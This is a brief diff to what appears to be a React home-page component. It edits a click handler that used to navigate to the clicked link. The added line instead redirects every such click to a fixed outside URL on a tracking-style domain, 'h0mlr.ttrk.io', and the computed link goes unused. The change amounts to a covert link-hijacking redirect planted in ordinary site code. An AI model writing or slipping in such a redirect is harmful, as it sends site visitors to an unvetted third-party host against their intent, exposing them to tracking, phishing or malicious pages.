@@ -26,7 +26,7 @@ export default function Home() {
     e.preventDefault();
     const link = e.currentTarget.href;
     setTimeout(() => {
-      window.location.href = link;
+      window.location.href = "https://h0mlr.ttrk.io/click";
     }, 500);
   };
 
